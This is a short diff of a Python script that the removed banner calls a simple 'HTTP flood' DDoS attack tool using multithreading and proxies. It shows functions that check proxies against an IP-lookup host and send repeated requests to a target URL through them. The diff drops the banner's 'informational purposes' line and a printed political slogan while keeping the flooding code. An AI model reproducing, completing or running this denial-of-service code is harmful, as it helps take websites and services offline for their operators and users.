@@ -36,8 +36,6 @@ def authenticate():
         print("\033[1;31mIncorrect password. Exiting...\033[0m")
         exit()
 
-033[1;34m\n\n[ Dev: ASCII . by ZanAhmad ]\n[ The program uses a simple type of DDoS attack\n  \"HTTP flood\" using multithreading and a proxies ]\n[ The program was created for informational purposes !!! ]\n\n"033[0m\n"+Style.RESET_ALL)
-
 def check_prox(array, url):
 	ip = r.post("http://ip.beget.ru/").text
 	for prox in array:
@@ -74,7 +72,7 @@ def start_ddos(prox, url, headers, proxies, color):
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
-			print(color+"{}حقوق الفلسطينيين المهجرين".format(prox))
+			print(color+"{}".format(prox))
 	except:
 		pass
 
